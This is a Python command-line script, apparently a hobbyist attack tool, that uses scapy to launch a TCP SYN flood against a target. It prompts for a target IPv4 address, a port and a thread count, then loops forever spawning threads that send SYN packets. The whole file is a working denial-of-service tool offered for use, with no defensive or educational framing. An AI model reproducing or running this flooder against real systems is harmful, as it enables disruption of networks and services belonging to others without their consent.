#!/usr/bin/env python3

from concurrent.futures import thread

try:
    from colorama import init, Fore, Back, Style
    from scapy.all import *
    import subprocess
    import threading
    import logging
    import math
    import time
    import sys
    import os
except Exception as e:
    print("[!] Library import error: %s " % e)

logging.basicConfig(format="%(message)s", level=logging.INFO)

init(convert=True)

class SYN():        

    def __init__(self,target,port,thread_count):
        self.start_time       = time.perf_counter()
        self.total_bytes      = 0
        self.total_data       = ''
        self.target           = target
        self.target_port      = port
        self.thread_count     = thread_count

    def SendSynPacket(self):
        try:
            synPkt   = sr1(IP(dst=self.target)/TCP(dport=int(self.target_port),flags='S'),verbose=False)
            logging.info(Style.BRIGHT + Back.BLACK + Fore.GREEN  + "[*] Sent TCP SYN Packet to -> %s:%s " % (self.target,self.target_port))
        except Exception as e:
            logging.info(Style.BRIGHT + Back.BLACK + Fore.RED    + "[!] Error: %s " % e)
            pass
        try:
            if(os.name == 'nt'):
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass

    def ContinuousSynFlood(self):
        try:
            while(True):
                for i in range(0,self.thread_count):
                    try:
                        t = threading.Thread(target=self.SendSynPacket)
                        t.daemon = True
                        t.start()
                    except:
                        pass
        except KeyboardInterrupt:
            logging.info("[!] Interrupt received , departing")
            time.sleep(1)
            sys.exit(1)

def main():
    #
    try:
        if(os.name == 'nt'):
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    #
    print(Style.BRIGHT + Back.BLACK + Fore.GREEN + """
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄                           
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌                          
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌░▌     ▐░▌                          
▐░▌          ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌                          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌                          
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌                          
 ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░▌   ▐░▌ ▐░▌                          
          ▐░▌     ▐░▌     ▐░▌    ▐░▌▐░▌                          
 ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░▌     ▐░▐░▌                          
▐░░░░░░░░░░░▌     ▐░▌     ▐░▌      ▐░░▌                          
 ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀        ▀▀                           
                                                                 
 ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀                                                                
    """)
    #
    target_address = input("[+] Enter the target IPV4 address-> ")
    tx_byte_count  = input("[+] Enter the target port-> ")
    thread_count   = int(input("[+] Enter the number of threads to allocate-> "))
    #
    time.sleep(3)
    #
    print(Style.BRIGHT + Back.RED + Fore.WHITE    + "[*] Starting TCP SYN Flood ")
    time.sleep(1)
    #
    FloodInstance = SYN(target_address,tx_byte_count,thread_count)
    FloodInstance.ContinuousSynFlood()

if(__name__ == '__main__'):
    main()